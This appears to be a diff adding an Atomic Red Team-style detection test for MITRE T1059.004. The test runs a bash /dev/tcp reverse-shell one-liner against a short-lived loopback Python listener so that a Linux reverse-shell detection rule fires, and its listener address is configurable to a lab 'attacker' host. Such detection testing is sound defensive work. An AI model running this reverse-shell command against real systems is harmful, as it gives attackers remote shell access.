@@ -1,0 +1,30 @@
+attack_technique: T1059.004
+display_name: 'Command and Scripting Interpreter: Unix Shell'
+atomic_tests:
+- name: DAC - Bash /dev/tcp reverse shell to a loopback listener
+  auto_generated_guid: 7a36a62e-0587-40cd-ad98-48b16570e3af
+  description: |
+    Runs the classic `bash -i >& /dev/tcp/IP/PORT 0>&1` reverse shell towards a listener on
+    127.0.0.2 (the whole 127.0.0.0/8 range is loopback on Linux, so nothing leaves the host,
+    and it deliberately avoids the rule's 127.0.0.1 health-check filter). A short-lived
+    Python listener accepts the connection and closes it after 3 seconds, so no interactive
+    shell is left behind. Triggers: proc_creation_lnx_reverse_shell.
+  supported_platforms:
+  - linux
+  input_arguments:
+    listener_ip:
+      description: Listener address (loopback or lab "attacker" host)
+      type: string
+      default: 127.0.0.2
+    listener_port:
+      description: Listener port
+      type: integer
+      default: 4444
+  executor:
+    command: |
+      python3 -c "import socket,time;s=socket.socket();s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1);s.bind(('#{listener_ip}',#{listener_port}));s.listen(1);s.settimeout(10);c,_=s.accept();time.sleep(3);c.close()" &
+      sleep 1
+      timeout 8 bash -c 'bash -i >& /dev/tcp/#{listener_ip}/#{listener_port} 0>&1' || true
+      wait
+    name: sh
+    elevation_required: false
